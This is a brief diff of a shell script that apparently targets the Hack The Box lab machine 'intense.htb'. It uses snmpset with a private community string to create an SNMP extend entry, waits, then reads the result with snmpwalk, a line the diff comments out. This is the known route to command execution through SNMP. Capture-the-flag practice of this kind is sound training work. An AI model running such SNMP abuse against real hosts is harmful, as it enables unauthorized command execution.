@@ -5,5 +5,5 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStat
 
 sleep 2 
 
-snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects
+#snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects
 
